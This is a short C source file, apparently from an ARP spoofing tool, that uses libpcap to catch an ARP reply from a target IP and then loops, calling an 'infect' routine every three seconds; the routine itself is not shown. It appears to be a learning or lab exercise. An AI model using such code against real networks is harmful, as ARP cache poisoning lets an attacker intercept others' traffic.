#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>         //sleep
#include "arpheader.h"

/*
void*
thread_infect (void* arg)
{
 infect();
}
*/


int group_if(char * argv[],struct allpacket * packet)
{
    if(ntohs(packet->type) == ETHERTYPE_ARP     //broadcast 보낸 IP랑 일치 하는지 확인
           && ntohs(packet->opcode) == ARPOP_REPLY && packet->arp_sender_ip == inet_addr(argv[2]))
        return 1;

    return 0;
}

void process(char * argv[],pcap_t * handle)
{
    struct pcap_pkthdr* header;
    const u_char* packet;

    pcap_next_ex(handle, &header, &packet);
    struct allpacket * new_packet = (struct allpacket *) packet;

    pthread_t jthread;

    //pthread_create(&jthread,NULL,thread_infect,NULL);

    while(1)
    {
        switch(group_if(argv,new_packet)){
        case 1:
            infect(argv,handle,new_packet);             //감염함수 :: 성공
        sleep(3);
        }

        printf("search...\n");
    }
}
